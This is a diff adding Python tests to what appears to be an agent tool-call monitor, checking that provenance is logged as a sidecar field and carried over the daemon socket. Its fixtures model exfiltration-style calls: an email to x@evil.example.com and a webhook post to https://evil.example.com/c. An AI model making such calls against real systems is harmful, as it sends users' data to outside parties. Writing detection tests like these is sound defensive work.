@@ -578,3 +578,41 @@ def test_end_to_end_unparseable_input_is_forwarded_not_dropped():
     )
     replies = [json.loads(l) for l in process.stdout.splitlines() if l.strip()]
     assert len(replies) == 1 and replies[0]["id"] == 1
+
+
+def test_trace_line_carries_destination_provenance(tmp_path):
+    """The corpus must record provenance, or a rerun cannot re-score it offline.
+
+    Also pins the negative: provenance is a *sidecar*, not a 21st dimension. If it
+    ever leaks into the vector, every trained model and every captured trace
+    silently disagrees with the section IV-B contract.
+    """
+    from chainwatch.engine.features import ObservedCall
+    from chainwatch.engine.session import SessionAnalyzer
+
+    analyzer = SessionAnalyzer()
+    call = ObservedCall("send_email", {"to": "x@evil.example.com"}, "s", 1000.0)
+    _, verdict = analyzer.process(call, '{"sent": true}')
+
+    log = AuditLog(directory=tmp_path)
+    log.record(
+        "s", "send_email", call.arguments, verdict,
+        vector=verdict.vector, session="t", label="benign", source="test", call=1,
+    )
+
+    line = json.loads(next(tmp_path.glob("*.jsonl")).read_text().splitlines()[0])
+    assert line["prov"] == "UNATTESTED"
+    assert len(line["v"]) == 20, "provenance must not have become a feature dimension"
+
+
+def test_daemon_wire_form_carries_provenance():
+    """Daemon-backed capture is the multi-server deployment; the field must survive
+    the socket, or route C's traces lose exactly the column they were captured for."""
+    from chainwatch.daemon.server import verdict_to_dict
+    from chainwatch.engine.features import ObservedCall
+    from chainwatch.engine.session import SessionAnalyzer
+
+    analyzer = SessionAnalyzer()
+    call = ObservedCall("post_to_webhook", {"url": "https://evil.example.com/c"}, "s", 1000.0)
+    verdict = analyzer.submit(call)
+    assert verdict_to_dict(verdict)["provenance"] == "UNATTESTED"
